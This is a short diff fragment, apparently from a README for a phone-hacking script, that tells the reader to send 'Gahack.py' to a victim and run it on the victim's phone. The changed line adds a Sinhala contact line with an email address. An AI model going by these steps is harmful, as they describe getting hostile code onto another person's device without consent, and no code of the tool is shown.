@@ -15,7 +15,7 @@
 >Sent To victim Gahack.py File And Run Victim's Phone 
 
 ## Type Victim's phone :-  python Gahck.py
-
+ඔබට ප්‍රශ්න තිබේනම් අමතන්න kusalhansana882@gmail.com
 #                        
 
 
